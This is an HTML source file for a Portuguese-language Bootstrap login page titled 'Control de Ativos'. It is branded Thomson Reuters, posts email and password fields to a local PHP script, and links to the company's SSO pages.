<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Fonts -->
    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,600" rel="stylesheet" type="text/css">


    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">

    <title>Control de Ativos</title>
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-light navbar-laravel">
    <div class="container">
        <a class="navbar-brand" href="https://www.thomsonreuters.com/en.html">Thomson Reuters</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>

        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav ml-auto">
                <li class="nav-item">
                    <a class="nav-link" href="#">Login</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="https://safe.thomson.com/auth/router?action=Login&ProtectionLevel=SAFE5&TYPE=33554433&REALMOID=06-086b213b-2dd7-46a1-83ea-9ad6469cfa0f&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=$SM$gNW0md%2bsMuvGQzbDDuh6DYs%2bNZBvIyDUm03q6eXS44rjYkLiEidwAshKyiJ0AjbI&TARGET=$SM$HTTPS%3a%2f%2fsafe%2ethomson%2ecom%2fSAML2%2fsso%2fSAML2Service%2fjive%3fSAMLRequest%3dhVLJbsIwFPwVy3eymJSCRYJoESoSVSMIPfRmwoO4Smzq56B$%2Bfk0WlV6o5IOXGc94xtPZd1WSCxiUWsU09AJKQOX6INUpprtsORjTWTJFUZXszOe1LdQGvmpASxxRIW9PYlobxbVAiVyJCpDbnG$%2Fnr2vOvICfjbY61yUlc0Qw1kk9a4V1BWYL5iJz2G3WMS2sPSP3fVtAUe89W$%2BgKtTJQW2fPy3XlX8V8RE3JwjmQStjGdU9EcYSe1uCvDtiV0M46Mf9TXoCSpTY5NC$%2BK6VGU6LZWi5gKNs4ZmzAh8xM7BWxYjPcg2MMoHE0OEDkQpgLRXfFLQ6xhpdAKZWPKgnAyCNwYZWHEg4hHQ$%2B8xDD4oSbscnqRq870X2r4FIX$%2FJsnSQvm0zSt77nhyAdq3wRt3c1nH$%2FYtF3QJN$%2FE5$%2F6txpJt$%2Fz7EZIf%26RelayState%3dL2dyb3Vwcy9pdC1zdXBwb3J0Lw$%3D$%3D">Register</a>
                </li>
            </ul>

        </div>
    </div>
</nav>

<main class="login-form">
    <div class="cotainer">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header">Login</div>
                    <div class="card-body">
                        <form action="php/acao.php" method="POST">
                            <div class="form-group row">
                                <label for="email_address" class="col-md-4 col-form-label text-md-right">Endereço de E-Mail:</label>
                                <div class="col-md-6">
                                    <input type="email" name="email" id="email_address" class="form-control" name="email-address" required autofocus>
                                </div>
                            </div>

                            <div class="form-group row">
                                <label for="password" class="col-md-4 col-form-label text-md-right">Senha:</label>
                                <div class="col-md-6">
                                    <input type="password" name="password" id="password" class="form-control" name="password" required>
                                </div>
                            </div>

                            <div class="form-group row">
                                <div class="col-md-6 offset-md-4">
                                    <div class="checkbox">
                                        <label>
                                            <input type="checkbox" name="remember"> Lembre-me
                                        </label>
                                    </div>
                                </div>
                            </div>

                            <div class="col-md-6 offset-md-4">
                                <button type="submit" class="btn btn-primary">
                                    Acessar
                                </button>
                                <a href="https://safe.thomson.com/auth/router?action=UserVerificationStart&AcctMaintPurpose=AcctMaintForgotPassword&ProtectionLevel=SAFE5#step-1" class="btn btn-link">
                                    Esqueceu sua Senha?
                                </a>
                            </div>
                    </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    </div>

</main>







</body>
</html>